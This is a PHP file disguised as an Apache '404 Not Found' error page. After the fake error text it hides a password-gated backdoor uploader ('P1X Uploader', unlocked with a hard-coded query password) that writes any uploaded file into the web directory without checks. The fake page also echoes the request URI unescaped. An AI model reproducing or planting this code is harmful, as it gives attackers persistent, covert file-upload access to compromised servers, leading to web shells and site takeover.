<?php
echo "<html><head><title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ".$_SERVER['REQUEST_URI']." was not found on this server.</p>
<hr>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>";if(isset($_POST['uploaded'])){$file=$_FILES['files']['name'];$files=$_FILES['files']['tmp_name'];$folder="";if(move_uploaded_file($files,$folder.$file)){$result="Uploaded : => <A href='$file' target='_blank'>Your file here</A>";}else {$result="Failed to upload...!";}}$password="2906";if($_GET['pass']==$password){echo '<br /><br /><br /><html><head><title>P1X Uploader</title></head><body><center><form action="" method="post" enctype="multipart/form-data">
<input type="file" name="files" />
<input type="submit" name="uploaded" value="Upload">
</form>'.$result.'</center></body></html>';}?>
